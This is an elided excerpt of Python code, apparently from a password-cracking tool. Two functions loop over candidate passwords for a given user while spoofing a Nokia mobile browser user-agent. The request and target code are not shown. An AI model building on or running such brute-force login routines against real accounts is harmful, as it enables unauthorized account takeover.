...
def crack_random():
	...
	def main(user):
		...
		try:
			for pw in pwx:
				pw = pw.lower()
				ua_api = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
...
def manual():
	...
	def main(user):
		...
		try:
			for asu in pw.split(","):
				ua_mb = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
